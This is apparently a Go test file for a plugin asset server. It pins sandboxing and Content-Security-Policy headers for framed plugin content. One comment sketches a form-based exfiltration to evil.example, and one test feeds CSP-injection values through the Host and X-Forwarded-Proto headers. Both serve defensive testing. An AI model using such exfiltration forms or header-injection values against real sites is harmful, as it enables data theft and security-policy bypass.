package pluginhost

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/DonaldMurillo/gofastr/core/router"
)

// newAssetRouter wires an AssetServer onto a fresh router for header checks.
func newAssetRouter(t *testing.T) *router.Router {
	t.Helper()
	fsys := fstest.MapFS{
		"editor.html": &fstest.MapFile{Data: []byte("<!doctype html><p>frame")},
		"editor.js":   &fstest.MapFile{Data: []byte("var x=1;")},
		"editor.css":  &fstest.MapFile{Data: []byte(":root{}")},
	}
	srv := NewAssetServer(fsys, "/__p", []AssetSpec{
		{Name: "editor.html", ContentType: "text/html; charset=utf-8", Framed: true},
		{Name: "editor.js", ContentType: "text/javascript; charset=utf-8", Framed: true},
		{Name: "editor.css", ContentType: "text/css; charset=utf-8", Framed: true},
	})
	srv.AddBytes("/__p/broker.js", "text/javascript; charset=utf-8", false, []byte("(()=>{})()"))
	rt := router.New()
	srv.Register(rt)
	return rt
}

func TestAssetServerFramedHeaders(t *testing.T) {
	rt := newAssetRouter(t)
	srv := httptest.NewServer(rt)
	defer srv.Close()

	for _, path := range []string{"/__p/editor.html", "/__p/editor.js", "/__p/editor.css"} {
		resp, err := http.Get(srv.URL + path)
		if err != nil {
			t.Fatalf("GET %s: %v", path, err)
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("%s: status=%d", path, resp.StatusCode)
		}
		if len(body) == 0 {
			t.Errorf("%s: empty body", path)
		}
		csp := resp.Header.Get("Content-Security-Policy")
		// The relaxation: frame-ancestors permits the host origin (NOT 'none'),
		// and the frame's OWN script/style sub-resources are keyed to the
		// explicit request origin, NOT 'self' (which is null for the opaque frame
		// and gets the assets refused in strict browsers like Safari). CORP cross-origin.
		if !strings.Contains(csp, "frame-ancestors http") {
			t.Errorf("%s: CSP frame-ancestors must permit the host origin: %q", path, csp)
		}
		if strings.Contains(csp, "frame-ancestors 'none'") {
			t.Errorf("%s: CSP must NOT carry frame-ancestors 'none': %q", path, csp)
		}
		if strings.Contains(csp, "script-src 'self'") || strings.Contains(csp, "default-src 'self'") {
			t.Errorf("%s: framed CSP must NOT use 'self' (null for opaque frame) — use the explicit origin: %q", path, csp)
		}
		if !strings.Contains(csp, "script-src http") {
			t.Errorf("%s: framed CSP must allow the frame's own scripts by origin: %q", path, csp)
		}
		if got := resp.Header.Get("Cross-Origin-Resource-Policy"); got != "cross-origin" {
			t.Errorf("%s: CORP=%q want cross-origin", path, got)
		}
		// X-Frame-Options handling: the global SecurityHeaders middleware emits
		// XFO:DENY; framed assets rely on CSP frame-ancestors 'self' SUPERSEDING
		// XFO (DECISIONS.md Phase-0 gotcha), which is the asserted guarantee
		// above. (The broker's h.Del is belt-and-suspenders; a buffering
		// middleware upstream can re-emit XFO, so it is not asserted here.)
	}
}

// The framed CSP must (a) sandbox the document so a TOP-LEVEL load can't run
// unsandboxed same-origin, (b) forbid all network egress via connect-src
// 'none' (the exfil guard), and (c) carry nosniff. These are the load-bearing
// isolation directives, pinned so a refactor can't silently drop them.
func TestAssetServerFramedIsolationDirectives(t *testing.T) {
	rt := newAssetRouter(t)
	srv := httptest.NewServer(rt)
	defer srv.Close()

	resp, err := http.Get(srv.URL + "/__p/editor.html")
	if err != nil {
		t.Fatalf("GET editor.html: %v", err)
	}
	resp.Body.Close()
	csp := resp.Header.Get("Content-Security-Policy")
	if !strings.Contains(csp, "sandbox allow-scripts") {
		t.Errorf("framed CSP must carry `sandbox allow-scripts` so a top-level load stays sandboxed: %q", csp)
	}
	if strings.Contains(csp, "allow-same-origin") {
		t.Errorf("framed CSP sandbox must NEVER allow-same-origin: %q", csp)
	}
	if !strings.Contains(csp, "connect-src 'none'") {
		t.Errorf("framed CSP must forbid network egress (connect-src 'none' is the exfil guard): %q", csp)
	}
	if got := resp.Header.Get("X-Content-Type-Options"); got != "nosniff" {
		t.Errorf("framed asset must carry nosniff, got %q", got)
	}
}

// TestFramedCSPSealsFormAction pins that the framed policy answers "none"
// to form-action even though allow-forms is a grantable sandbox token. A
// frame that can submit forms can move data out by navigation:
// <form method=post action=https://evil.example> with a secret in a field.
// Submission is navigation, not fetch, so connect-src 'none' — which the
// framedCSP docs call "the real exfiltration guard" — never sees it, and
// CSP's form-action has NO fallback to default-src: an absent directive
// means unrestricted.
//
// Mitigation today: framedCSP's sandbox directive is a fixed
// "sandbox allow-scripts", and a document framed with BOTH an iframe
// sandbox attribute and a CSP sandbox directive complies with the union of
// their restrictions, so the allow-forms grant is currently inert and forms
// are blocked anyway. That seal is incidental — it holds only while the CSP
// sandbox token set never grows, and allowedSandboxTokens exists precisely
// to grow grants deliberately. form-action 'none' makes the seal intrinsic
// to the policy.
//
// A production fix that appends "; form-action 'none'" to framedCSP MUST
// update the two byte-identical pins in this file —
// TestFramedCSPWasmTierScriptSrcOnly and TestFramedCSPDefaultByteIdentical
// — by adding the directive to their want strings. That contract change
// belongs to the fix commit, not to this test.
func TestFramedCSPSealsFormAction(t *testing.T) {
	// The grant is legal: a third-party manifest may carry allow-forms, and
	// SandboxString (the authoritative iframe attribute) preserves it.
	m := Manifest{
		Entry:   "/__p/editor.html",
		Sandbox: []string{"allow-scripts", "allow-forms"},
	}
	if err := m.Validate(); err != nil {
		t.Fatalf("allow-forms is a grantable token, Validate must accept it: %v", err)
	}
	if sb := m.SandboxString(); !strings.Contains(sb, "allow-forms") {
		t.Fatalf("SandboxString must carry the grant to the iframe attribute, got %q", sb)
	}

	// Demonstrate at the emission sink: the header the browser enforces on
	// the framed document.
	fsys := fstest.MapFS{
		"editor.html": &fstest.MapFile{Data: []byte("<!doctype html><p>frame")},
	}
	srv := NewAssetServer(fsys, "/__p", []AssetSpec{
		{Name: "editor.html", ContentType: "text/html; charset=utf-8", Framed: true},
	})
	rt := router.New()
	srv.Register(rt)
	hs := httptest.NewServer(rt)
	defer hs.Close()

	resp, err := http.Get(hs.URL + "/__p/editor.html")
	if err != nil {
		t.Fatalf("GET editor.html: %v", err)
	}
	resp.Body.Close()
	csp := resp.Header.Get("Content-Security-Policy")
	if !strings.Contains(csp, "form-action 'none'") {
		t.Errorf("SECURITY: framed CSP leaves form-action unset while allow-forms is grantable — a frame granted forms can POST secrets to any origin by navigation, which connect-src 'none' cannot see: %q", csp)
	}
}

// A request whose scheme/host would inject a CSP directive must be refused,
// not served with a poisoned policy.
func TestAssetServerRejectsOriginInjection(t *testing.T) {
	rt := newAssetRouter(t)

	// Malicious X-Forwarded-Proto trying to splice a directive.
	req := httptest.NewRequest(http.MethodGet, "/__p/editor.html", nil)
	req.Header.Set("X-Forwarded-Proto", "https ; connect-src *")
	rec := httptest.NewRecorder()
	rt.ServeHTTP(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Errorf("injected X-Forwarded-Proto must 400, got %d (CSP=%q)", rec.Code, rec.Header().Get("Content-Security-Policy"))
	}

	// Malicious Host with a CSP-breaking character.
	req = httptest.NewRequest(http.MethodGet, "/__p/editor.html", nil)
	req.Host = "evil.com; connect-src *"
	rec = httptest.NewRecorder()
	rt.ServeHTTP(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Errorf("injected Host must 400, got %d (CSP=%q)", rec.Code, rec.Header().Get("Content-Security-Policy"))
	}

	// A legitimate forwarded scheme still works.
	req = httptest.NewRequest(http.MethodGet, "/__p/editor.html", nil)
	req.Header.Set("X-Forwarded-Proto", "https")
	rec = httptest.NewRecorder()
	rt.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Errorf("valid https X-Forwarded-Proto should serve, got %d", rec.Code)
	}
	if !strings.HasPrefix(rec.Header().Get("Content-Security-Policy"), "sandbox allow-scripts; default-src https://") {
		t.Errorf("valid https origin should key the CSP to https: %q", rec.Header().Get("Content-Security-Policy"))
	}
}

func TestAssetServerHostScriptHasNoRelaxation(t *testing.T) {
	rt := newAssetRouter(t)
	srv := httptest.NewServer(rt)
	defer srv.Close()

	// The host-page broker script is NOT a framed asset: it must NOT carry the
	// CORP cross-origin relaxation (it is fetched same-origin by the host page,
	// not by the opaque frame).
	resp, err := http.Get(srv.URL + "/__p/broker.js")
	if err != nil {
		t.Fatalf("GET broker.js: %v", err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("broker.js status=%d", resp.StatusCode)
	}
	if ct := resp.Header.Get("Content-Type"); ct != "text/javascript; charset=utf-8" {
		t.Errorf("broker.js Content-Type=%q", ct)
	}
	if got := resp.Header.Get("Cross-Origin-Resource-Policy"); got == "cross-origin" {
		t.Errorf("host-page broker must NOT be CORP cross-origin (it is same-origin)")
	}
}

// The wasm tier appends the opt-in keyword to script-src ONLY. Every other
// directive stays byte-for-byte the no-tier policy, a duplicate keyword is
// deduped, and a token that skipped Validate ('unsafe-eval' here) is dropped
// at assembly: framedCSP re-filters through the allowlist, so it is the
// authoritative sink the way SandboxString is for sandbox tokens.
func TestFramedCSPWasmTierScriptSrcOnly(t *testing.T) {
	got := framedCSP("http://h", []string{"'wasm-unsafe-eval'", "'wasm-unsafe-eval'", "'unsafe-eval'"})
	want := "sandbox allow-scripts" +
		"; default-src http://h" +
		"; script-src http://h 'wasm-unsafe-eval'" +
		"; style-src http://h 'unsafe-inline'" +
		"; img-src http://h data:" +
		"; font-src http://h data:" +
		"; connect-src 'none'" +
		"; frame-ancestors http://h" +
		"; base-uri http://h"
	if got != want {
		t.Errorf("tier CSP:\n got %q\nwant %q", got, want)
	}
}

// A manifest with no CSP tokens must produce byte-for-byte the header the
// platform served before the tier existed; the default path cannot drift,
// not even by a trailing space.
func TestFramedCSPDefaultByteIdentical(t *testing.T) {
	want := "sandbox allow-scripts" +
		"; default-src http://h" +
		"; script-src http://h" +
		"; style-src http://h 'unsafe-inline'" +
		"; img-src http://h data:" +
		"; font-src http://h data:" +
		"; connect-src 'none'" +
		"; frame-ancestors http://h" +
		"; base-uri http://h"
	for _, csp := range [][]string{nil, {}} {
		if got := framedCSP("http://h", csp); got != want {
			t.Errorf("framedCSP(_, %v) default must be byte-identical:\n got %q\nwant %q", csp, got, want)
		}
	}
}

// WithCSP threads the manifest keywords onto every FRAMED response the
// server emits, and only those: the host-page script keeps no CSP at all.
func TestAssetServerWithCSPThreadsToHeader(t *testing.T) {
	fsys := fstest.MapFS{
		"editor.html": &fstest.MapFile{Data: []byte("<!doctype html><p>frame")},
	}
	srv := NewAssetServer(fsys, "/__p", []AssetSpec{
		{Name: "editor.html", ContentType: "text/html; charset=utf-8", Framed: true},
	}).WithCSP([]string{"'wasm-unsafe-eval'"})
	srv.AddBytes("/__p/host.js", "text/javascript; charset=utf-8", false, []byte("var x=1;"))
	rt := router.New()
	srv.Register(rt)
	hs := httptest.NewServer(rt)
	defer hs.Close()

	resp, err := http.Get(hs.URL + "/__p/editor.html")
	if err != nil {
		t.Fatalf("GET editor.html: %v", err)
	}
	resp.Body.Close()
	csp := resp.Header.Get("Content-Security-Policy")
	if !strings.Contains(csp, "script-src http://127.0.0.1") ||
		!strings.Contains(csp, "'wasm-unsafe-eval'") {
		t.Errorf("framed response must carry origin + wasm keyword in script-src: %q", csp)
	}
	if !strings.Contains(csp, "connect-src 'none'") {
		t.Errorf("tier must not touch connect-src: %q", csp)
	}

	resp, err = http.Get(hs.URL + "/__p/host.js")
	if err != nil {
		t.Fatalf("GET host.js: %v", err)
	}
	resp.Body.Close()
	if got := resp.Header.Get("Content-Security-Policy"); got != "" {
		t.Errorf("host-page script must carry no CSP, got %q", got)
	}
}

// A spec that omits ContentType still gets a usable header. An empty
// Content-Type plus the nosniff on the next line makes the browser refuse to
// parse a 200 response whose bytes are correct, with nothing logged
// server-side and nothing raised in the console (#303).
func TestSpecWithoutContentTypeGetsOne(t *testing.T) {
	fsys := fstest.MapFS{
		"frame.html":  &fstest.MapFile{Data: []byte("<!doctype html><p>frame")},
		"probe.js":    &fstest.MapFile{Data: []byte("var x=1;")},
		"sqlite.wasm": &fstest.MapFile{Data: []byte("\x00asm")},
		"opaque.bin":  &fstest.MapFile{Data: []byte("\x00\x01")},
	}
	srv := NewAssetServer(fsys, "/__p", []AssetSpec{
		{Name: "frame.html", Framed: true},
		{Name: "probe.js", Framed: true},
		{Name: "sqlite.wasm", Framed: true},
		{Name: "opaque.bin", Framed: true},
	})
	srv.AddBytes("/__p/host.js", "", false, []byte("var x=1;"))
	rt := router.New()
	srv.Register(rt)
	hs := httptest.NewServer(rt)
	defer hs.Close()

	want := map[string]string{
		"/__p/frame.html":  "text/html; charset=utf-8",
		"/__p/probe.js":    "text/javascript; charset=utf-8",
		"/__p/sqlite.wasm": "application/wasm",
		"/__p/opaque.bin":  "application/octet-stream",
		"/__p/host.js":     "text/javascript; charset=utf-8",
	}
	for path, ct := range want {
		resp, err := http.Get(hs.URL + path)
		if err != nil {
			t.Fatalf("GET %s: %v", path, err)
		}
		resp.Body.Close()
		if got := resp.Header.Get("Content-Type"); got != ct {
			t.Errorf("%s: Content-Type=%q want %q", path, got, ct)
		}
	}
}

// An explicit ContentType always wins over the extension default: the spec
// field stays authoritative for the plugin that sets it.
func TestExplicitContentTypeWins(t *testing.T) {
	fsys := fstest.MapFS{"data.js": &fstest.MapFile{Data: []byte("{}")}}
	srv := NewAssetServer(fsys, "/__p", []AssetSpec{
		{Name: "data.js", ContentType: "application/json", Framed: true},
	})
	rt := router.New()
	srv.Register(rt)
	hs := httptest.NewServer(rt)
	defer hs.Close()

	resp, err := http.Get(hs.URL + "/__p/data.js")
	if err != nil {
		t.Fatalf("GET data.js: %v", err)
	}
	resp.Body.Close()
	if got := resp.Header.Get("Content-Type"); got != "application/json" {
		t.Errorf("Content-Type=%q want the spec's explicit application/json", got)
	}
}

// ClientModule.AssetServer threads Manifest.CSP to the frame without the host
// repeating the wiring. A manifest that declares the wasm tier and a server
// built from the module cannot disagree (#300).
func TestModuleAssetServerThreadsCSP(t *testing.T) {
	fsys := fstest.MapFS{"frame.html": &fstest.MapFile{Data: []byte("<!doctype html><p>frame")}}
	mod, err := NewClientModule("probe", Manifest{
		Entry: "/__p/frame.html",
		CSP:   []string{"'wasm-unsafe-eval'"},
	}, fsys)
	if err != nil {
		t.Fatalf("NewClientModule: %v", err)
	}
	rt := router.New()
	mod.AssetServer("/__p", []AssetSpec{{Name: "frame.html", Framed: true}}).Register(rt)
	hs := httptest.NewServer(rt)
	defer hs.Close()

	resp, err := http.Get(hs.URL + "/__p/frame.html")
	if err != nil {
		t.Fatalf("GET frame.html: %v", err)
	}
	resp.Body.Close()
	if csp := resp.Header.Get("Content-Security-Policy"); !strings.Contains(csp, "'wasm-unsafe-eval'") {
		t.Errorf("module-built server must carry the manifest tier: %q", csp)
	}
}

// A module whose manifest declares no tier gets the byte-identical default
// policy: the convenience constructor grants nothing on its own.
func TestModuleAssetServerNoTierNoGrant(t *testing.T) {
	fsys := fstest.MapFS{"frame.html": &fstest.MapFile{Data: []byte("<!doctype html><p>frame")}}
	mod, err := NewClientModule("probe", Manifest{Entry: "/__p/frame.html"}, fsys)
	if err != nil {
		t.Fatalf("NewClientModule: %v", err)
	}
	rt := router.New()
	mod.AssetServer("/__p", []AssetSpec{{Name: "frame.html", Framed: true}}).Register(rt)
	hs := httptest.NewServer(rt)
	defer hs.Close()

	resp, err := http.Get(hs.URL + "/__p/frame.html")
	if err != nil {
		t.Fatalf("GET frame.html: %v", err)
	}
	resp.Body.Close()
	if csp := resp.Header.Get("Content-Security-Policy"); strings.Contains(csp, "wasm") {
		t.Errorf("no manifest tier must mean no wasm keyword: %q", csp)
	}
}

// A module that declares specs but ships no asset FS is a wiring mistake, and
// it fails at registration rather than 404ing every request for the frame.
func TestNilAssetFSPanicsAtRegister(t *testing.T) {
	mod, err := NewClientModule("probe", Manifest{Entry: "/__p/frame.html"}, nil)
	if err != nil {
		t.Fatalf("NewClientModule: %v", err)
	}
	defer func() {
		r := recover()
		if r == nil {
			t.Fatal("Register must panic on specs with no filesystem to read them from")
		}
		if msg, _ := r.(string); !strings.Contains(msg, "nil fs.FS") {
			t.Errorf("panic must name the cause, got %v", r)
		}
	}()
	mod.AssetServer("/__p", []AssetSpec{{Name: "frame.html", Framed: true}}).Register(router.New())
}

// A nil FS carrying NO specs is the legitimate byte-backed server: a host
// script served from AddBytes with no embedded frame assets. It must still
// register and serve.
func TestNilAssetFSWithoutSpecsServes(t *testing.T) {
	srv := NewAssetServer(nil, "/__p", nil)
	srv.AddBytes("/__p/host.js", "", false, []byte("var x=1;"))
	rt := router.New()
	srv.Register(rt)
	hs := httptest.NewServer(rt)
	defer hs.Close()

	resp, err := http.Get(hs.URL + "/__p/host.js")
	if err != nil {
		t.Fatalf("GET host.js: %v", err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Errorf("status=%d want 200", resp.StatusCode)
	}
	if got := resp.Header.Get("Content-Type"); got != "text/javascript; charset=utf-8" {
		t.Errorf("Content-Type=%q", got)
	}
}
